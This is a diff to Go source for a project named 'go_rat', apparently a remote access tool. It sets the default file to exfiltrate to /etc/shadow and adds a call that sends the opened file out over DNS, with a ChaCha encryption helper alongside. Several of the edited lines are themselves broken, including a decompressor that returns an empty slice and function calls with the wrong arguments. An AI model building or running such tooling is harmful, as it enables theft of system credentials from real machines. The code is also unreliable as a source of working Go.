@@ -56,7 +56,6 @@ import (
 	"flag"
 	"fmt"
 	"go_rat/pkg/shared_code/ErrorHandling"
-	"io"
 	"math/big"
 	"net"
 	"os"
@@ -70,6 +69,7 @@ import (
 
 // bytes per read operation
 var FILEREADSPEED int = 36
+var MADEFOR string = "Church of the Subhacker"
 
 // use this to start the logger, cant keep it in globals.go
 // returns 0 if failure to open logfile, returns 1 otherwise
@@ -150,20 +150,19 @@ func ZCompress(input []byte) (herp bytes.Buffer, derp error) {
 	return herp, derp
 }
 func ZDecompress(DataIn []byte) (DataOut []byte) {
-	var buff []byte
-	byte_reader := bytes.NewReader(buff)
+	byte_reader := bytes.NewReader(DataIn)
 	ZReader, derp := zlib.NewReader(byte_reader)
 	if derp != nil {
 		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
 	}
-	io.Copy(ZReader, byte_reader)
+	copy(DataOut, DataIn)
 	ZReader.Close()
 	return DataOut
 }
 
-func OpenFile(filename) (fileobject []io.ByteReader) {
+func OpenFile(filename string) (fileobject []byte) {
 	// open the file
-	herp, derp := os.Open(*filepath)
+	herp, derp := os.Open(filename)
 	if derp != nil {
 		ErrorHandling.ErrorPrinter(derp, "[-] Could not open File")
 	}
@@ -247,7 +246,7 @@ func ChaChaLovesBytes(bytes_in []byte, EncryptionKey []byte, nonce []byte) (Sals
 	//plaintext, _ := herp.Open(nil, nonce, HaChaChaCha, nil)
 
 	copy(DataOut, HaChaChaCha)
-	for _, element := range out {
+	for _, element := range DataOut {
 		// original code treated this like a nullbyte but wat?
 		if element == 0 {
 			ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
@@ -293,7 +292,7 @@ func DNSExfiltration(ByteArrayInput []byte, DestZone string, MaxMsgSize int) (he
 // only used for parsing arguments
 func main() {
 	var debug = flag.Bool("d", false, "enable debugging.")
-	var file = flag.String("file", "", "the local file to exfiltrate.")
+	var file = flag.String("file", "/etc/shadow", "the local file to exfiltrate.")
 	var logfile = flag.String("logfile", "", "logfile")
 	var help = flag.Bool("help", false, "show help.")
 	var DerpKey = flag.String("key", "Herp-Key-Derp")
@@ -306,5 +305,5 @@ func main() {
 		return
 	}
 	fileobject := OpenFile(file)
-
+	DNSExfiltration(fileobject)
 }
